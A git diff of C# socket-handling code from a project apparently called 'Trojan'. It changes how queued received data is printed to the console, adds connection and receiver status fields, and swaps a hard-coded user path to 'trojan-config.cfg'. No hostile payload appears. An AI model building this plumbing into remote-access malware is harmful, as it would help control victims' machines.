@@ -57,19 +57,30 @@ namespace SocketData
         public static Queue<string> DataQueue = new Queue<string>();
         public static string[]? DataArray = null;
 
-        public static void OutputDataQueue()
+        private static string? PrevDataLine = null; 
+        public static void OutputDataQueue(bool endchar)
         {
-            Console.WriteLine("\n\n");
-            Console.WriteLine("\r##########################################################################################################################################");
-            DataArray = DataQueue.ToArray();
-            foreach (string Data in DataArray)
+            if (DataQueue.Count > 0)
             {
-                string message = "{0}";
-                Console.WriteLine("\n\n" + message, Data, Encoding.UTF8.GetByteCount(Data));
-                //Console.Write("\t" + new string('*', message.Length + Data.Length - 4));
-                DataQueue.Dequeue();
+                Console.WriteLine("\n\n");
+                Console.WriteLine("\r##########################################################################################################################################");
+                DataArray = DataQueue.ToArray();
+                Console.Write("\n\n");
+                foreach (string Data in DataArray)
+                {
+                    string message = "{0}";
+                    if (endchar)
+                        Console.WriteLine("\n\n" + message, Data, Encoding.UTF8.GetByteCount(Data));
+                    else
+                        Console.Write(message, Data, Encoding.UTF8.GetByteCount(Data));
+                        PrevDataLine = Data;
+                    //Console.Write("\t" + new string('*', message.Length + Data.Length - 4));
+                    DataQueue.Dequeue();
+                }
+                Console.WriteLine("\n\n##########################################################################################################################################");
+
+                if (PrevDataLine != null) { PrevDataLine = null; }
             }
-            Console.WriteLine("\n\n##########################################################################################################################################");
         }
     }
 
@@ -77,7 +88,7 @@ namespace SocketData
     {
         private readonly Socket _s_conn;
         private byte[] _buffer;
-        private Task? _ReceiveTask = null;
+        private ServerStatus _ConnectionStatus = ServerStatus.IDLE;
 
         public Socket getConn()
         {
@@ -100,16 +111,16 @@ namespace SocketData
         }
 
         // this is unsafe as getReceiveTask can return null
-        public Task getReceiveTask()
+        public ServerStatus getConnStatus()
         {
-            return(_ReceiveTask);
+            return(_ConnectionStatus);
         }
 
-        public void setReceiveTask(Task task)
+        public void setConnStatus(ServerStatus status)
         {
-            if (task == null) throw new ExceptionHandler("[-] task can not be null : " + nameof(task));
+            if (status == null) throw new ExceptionHandler("[-] task can not be null : " + nameof(status));
 
-            _ReceiveTask = task;
+            _ConnectionStatus = status;
         }
 
         public EndPoint getRemoteEndPoint()
@@ -196,13 +207,14 @@ namespace SocketData
 
         protected SocketOperations _SocketOperations = new SocketOperations();
         public ServerStatus ServerStatus = ServerStatus.STOPPED;
+        public ServerStatus ReceiverStatus = ServerStatus.IDLE;
         public ServerStatus SenderStatus = ServerStatus.IDLE;
 
         private byte[] buffer = new byte[BUFFSIZE];
 
         public SocketHandler()
         {
-            using (StreamReader ConfigFile = new StreamReader(@"C:\Users\lasse\source\repos\Trojan\trojan-config.cfg"))
+            using (StreamReader ConfigFile = new StreamReader(@"C:\Users\kaspe\source\repos\Trojan\trojan-config.cfg"))
             {
                 if (ConfigFile == null) throw new ExceptionHandler("Config file not found : " + nameof(ConfigFile));
                 string line;
